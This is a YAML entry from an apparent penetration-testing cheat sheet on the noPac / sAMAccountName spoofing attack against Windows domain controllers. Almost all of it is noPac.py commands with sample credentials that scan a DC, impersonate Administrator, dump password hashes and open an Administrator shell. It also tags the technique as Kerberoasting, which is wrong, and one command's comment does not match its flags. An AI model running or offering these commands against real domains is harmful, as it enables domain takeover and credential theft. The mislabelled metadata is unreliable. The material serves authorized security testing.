---
description: |
  noPac / sAMAccountName spoofing (CVE-2021-42278 / CVE-2021-42287) — exploit machine account name impersonation to gain Domain Admin privileges via forged Kerberos tickets.
commands:
  - have: Credentials
    cmd: |
      # Scan to check if target is vulnerable
      python3 noPac.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 -scan

      # Exploit — impersonate Administrator and dump hashes
      python3 noPac.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -dump

      # Exploit — get a shell as Administrator
      python3 noPac.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -shell

      # Exploit — export ticket for use with other tools
      python3 noPac.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -dc-host DC01 --impersonate administrator -dump -just-dc-user administrator
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - Kerberoasting
references:
  - https://github.com/Ridter/noPac
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/samaccountname-spoofing.html
---
